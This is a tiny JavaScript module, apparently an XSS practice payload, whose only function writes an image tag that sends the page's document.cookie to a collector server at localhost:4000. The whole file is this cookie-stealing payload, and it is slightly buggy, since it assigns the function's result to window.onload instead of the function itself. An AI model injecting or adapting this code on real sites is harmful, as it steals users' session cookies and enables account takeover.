
export function cookie(){
    window.onload= getCookie()
}

function getCookie(){
    const x = document.write('<img src="http://localhost:4000/?'+document.cookie+'">');
    console.log(x)
}

